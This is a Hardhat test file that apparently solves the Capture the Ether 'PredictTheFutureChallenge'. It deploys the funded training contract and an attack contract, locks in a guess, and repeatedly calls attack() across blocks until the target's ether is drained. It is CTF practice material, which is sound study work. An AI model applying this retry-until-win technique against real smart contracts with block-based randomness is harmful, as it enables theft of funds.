import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const attackFactory = await ethers.getContractFactory('PredictTheFutureAttack');
    const attackContract = await attackFactory.deploy(target.address);
    await attackContract.deployed();

    const lockInGuessTx = await attackContract.lockInGuess({ value: utils.parseEther('1') });
    await lockInGuessTx.wait();

    while (!(await target.isComplete())) {
      try {
        const attackTx = await attackContract.attack();
        await attackTx.wait();
      } catch (err) {
        console.log(err);
      }
      const blockNumber = await provider.getBlockNumber();
      console.log(`Tried block number: ${blockNumber}`);
    }

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
